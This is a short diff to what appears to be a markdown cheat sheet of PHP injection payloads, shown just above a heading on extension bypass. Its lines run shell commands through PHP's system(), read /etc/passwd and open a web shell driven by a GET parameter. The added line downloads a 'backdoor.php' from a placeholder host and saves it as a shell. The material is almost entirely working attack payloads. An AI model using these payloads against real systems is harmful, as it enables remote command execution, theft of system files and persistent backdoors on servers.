@@ -10,6 +10,7 @@ ${@system('ls -la')}
 <?php system('tail /etc/passwd'); ?>
 <?php echo "<pre>"; system($_GET[cmd]); ?> 
 <?php system('wget https://redacted.com/yourfile.php'); ?>
+system('curl https://redacted.com/backdoor.php -o /path/shell.php');
 ```
 # Extension Bypass
 ```
